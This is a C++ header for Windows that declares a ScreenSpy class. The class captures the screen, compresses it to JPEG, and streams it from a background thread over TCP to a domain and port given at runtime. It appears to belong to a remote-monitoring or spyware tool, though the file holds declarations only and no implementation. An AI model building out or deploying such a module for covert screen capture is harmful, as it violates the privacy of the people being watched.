


#ifndef SCREENSPY_H
#define SCREENSPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tchar.h>

extern "C" {
#include "jpeg/jpeglib.h"
#include "jpeg/jmorecfg.h"
#include "jpeg/jconfig.h"
}

class ScreenSpy
{
public:
    ScreenSpy();
    ~ScreenSpy();

    static bool captureScreen(std::vector<unsigned char> &bmpData);
    static unsigned int convertToJpgData(const std::vector<unsigned char> &bmpData,
                                 std::vector<unsigned char> &jpgData);

    typedef struct {
        unsigned int len;
    } ScreenSpyHeader;

    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);

    static void startScreenSpy(std::string domain, int port);
    static bool sendScreenData(TcpSocket *sock, std::vector<unsigned char> &jpg, unsigned int len);
};

#endif // SCREENSPY_H
